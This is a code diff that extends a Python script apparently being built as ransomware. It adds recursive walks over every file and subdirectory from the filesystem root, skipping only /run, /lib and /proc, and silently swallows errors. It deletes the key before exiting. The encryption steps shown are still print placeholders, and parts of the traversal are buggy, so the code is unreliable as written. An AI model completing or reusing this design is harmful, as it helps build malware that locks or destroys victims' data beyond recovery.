@@ -18,6 +18,33 @@ def recurse(dir, key):
     files = next(os.walk(dir))[2]
     # print('root={0}, dir={1}, file={2}'.format(root, dirs, files))
 
+    for file in files:
+        try:
+            # Start encrypting
+            print('Encrypting files')
+        except:
+            pass
+
+    if len(dirs) > 0:
+        for di in dirs:
+            try:
+                subdirs = next(os.walk(os.path.join(root, dir)))[1]
+                subfiles = next(os.walk(os.path.join(root, dir)))[2]
+                for subfile in subfiles:
+                    try:
+                        print('Encrypting subfiles')
+                    except:
+                        pass
+                if len(subdirs) > 0:
+                    for subdir in subdirs:
+                        path = root + '/' + di + '/' + subdir
+                        try:
+                            recurse(path, key)
+                        except:
+                            pass
+            except:
+                pass
+
 
 def generate_key(salt):
     os.urandom(16)
@@ -79,6 +106,14 @@ def main():
         if (directory != '/run') and (directory != '/lib') and (directory != '/proc'):
             print('Encrypting {}'.format(directory))
             recurse(directory, key)
+    files = next(os.walk(START))[2]
+    for file in files:
+        try:
+            print("Encrypting files in root")
+        except:
+            pass
+    del key
+    exit(0)
 
 
 if __name__ == '__main__':
